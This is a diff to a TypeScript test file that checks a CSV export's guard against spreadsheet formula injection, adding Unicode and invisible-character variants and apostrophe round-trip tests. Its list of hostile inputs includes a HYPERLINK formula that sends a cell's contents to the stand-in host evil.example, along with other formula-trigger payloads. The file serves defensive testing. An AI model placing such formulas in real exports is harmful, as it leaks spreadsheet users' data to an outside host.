@@ -12,7 +12,9 @@ import { recordEntry } from '../src/orders/entries';
 import { LIST_COLUMNS, csvCell, listCsv, unguardCell } from '../src/orders/list';
 import { ORIGIN, TEST_SEALING_KEY, THIS_MONTH, household, sessionCookie } from './helpers';
 
-const HOSTILE = ['\u0007=1+1', '\tcmd', '\rcmd', '=HYPERLINK("https://evil.example/?x="&A1,"Open")', '+1+1', '-2+3', '@SUM(A1:A9)', '\t=1+1', '\r=1+1', '  =1+1', '＝1+1', '＋1', '－1', '＠SUM(A1)'];
+const HOSTILE = ['\u0007=1+1', '\tcmd', '\rcmd', '=HYPERLINK("https://evil.example/?x="&A1,"Open")', '+1+1', '-2+3', '@SUM(A1:A9)', '\t=1+1', '\r=1+1', '  =1+1', '＝1+1', '＋1', '－1', '＠SUM(A1)',
+  // philobiblos#47 item 3: an invisible character first, and the small and other compatibility forms of = + - @ (NFKC).
+  '\u200b=1+1', '\u2060@SUM(A1)', '\ufeff+1', '\u200d-1', '\u00a0=1', '﹢1', '﹦1', '﹣1', '﹫x', '⁺1', '₌1'];
 
 describe('the CSV formula guard (philobiblos#45; OWASP CSV injection)', () => {
   it.each(HOSTILE)('a cell starting %j is written as text (a leading quote), quoted', (v) => {
@@ -27,14 +29,19 @@ describe('the CSV formula guard (philobiblos#45; OWASP CSV injection)', () => {
   it('ordinary text is only quoted; a quote inside is written twice; one row stays one line', () => {
     expect(csvCell('The Quiet Hedgehog')).toBe('"The Quiet Hedgehog"');
     expect(csvCell('Value "Beyond" Price')).toBe('"Value ""Beyond"" Price"');
-    expect(csvCell('\'s-Hertogenbosch, a history')).toBe('"\'s-Hertogenbosch, a history"');
     expect(csvCell('Two\nlines\r\nhere')).toBe('"Two lines  here"');
     expect(csvCell('A - B = C')).toBe('"A - B = C"'); // a formula character later in the cell is text
     expect(csvCell('')).toBe('""');
   });
 
+  it('a cell that starts with an apostrophe gets one more, which the import leaves out (philobiblos#47 item 2)', () => {
+    expect(csvCell('\'s-Hertogenbosch, a history')).toBe('"\'\'s-Hertogenbosch, a history"');
+    expect(csvCell('\'=x')).toBe('"\'\'=x"');
+    for (const v of ['\'=x', '\' Tis the season', '\'s-Hertogenbosch', '\'', '\'\'twice', '\'\t=1']) expect(unguardCell(parseCsv(csvCell(v))[0]![0]!), JSON.stringify(v)).toBe(v.replace(/\t/g, ' '));
+  });
+
   it('the importer reads a guarded cell back as it was; any other apostrophe stays', () => {
-    for (const v of ['=1+1', '+1', '-2+3', '@SUM(A1)', '  =1']) expect(unguardCell(parseCsv(csvCell(v))[0]![0]!)).toBe(v);
+    for (const v of ['=1+1', '+1', '-2+3', '@SUM(A1)', '  =1', '\u200b=1', '﹢1', '\u00a0=1', '⁺1']) expect(unguardCell(parseCsv(csvCell(v))[0]![0]!), JSON.stringify(v)).toBe(v);
     expect(unguardCell('\'s-Hertogenbosch')).toBe('\'s-Hertogenbosch');
     expect(unguardCell('\'Tis the season')).toBe('\'Tis the season');
   });
@@ -212,6 +219,14 @@ describe('the list as a CSV (GET /orders/{id}/list.csv)', () => {
 });
 
 describe('a guarded cell imported (orders/entries.ts reads the guard back)', () => {
+  it('a title that starts with an apostrophe, exported and imported with no ISBN, keeps it (philobiblos#47 item 2)', () => {
+    const d = household();
+    const rows = ['\' Tis the Season of Quiet Things', '\'=Not a Formula', '\'s-Hertogenbosch Days'].map((title) => ({ title, authors: ['Lena Paulsen'], isbn13: null, estimateC: null }));
+    const csv = listCsv(rows).replaceAll(',"1","",""\r\n', ',"1","12.00",""\r\n');
+    const r = recordEntry(d, 'p_alex', { kind: 'invoice', shop: 'Corner Books', csv, dryRun: true }, new Date(iso));
+    expect(r.lines.map((l) => [l.new, l.title])).toEqual(rows.map((b) => [true, b.title]));
+  });
+
   it('a new book from a guarded cell keeps its own title, without the quote the guard wrote', () => {
     const d = household();
     const csv = `title,author,qty,price\r\n${csvCell('=Sums of the Commons')},${csvCell('-Ada Example')},1,9.00\r\n${csvCell('\'s-Hertogenbosch Days')},,1,9.00\r\n`;
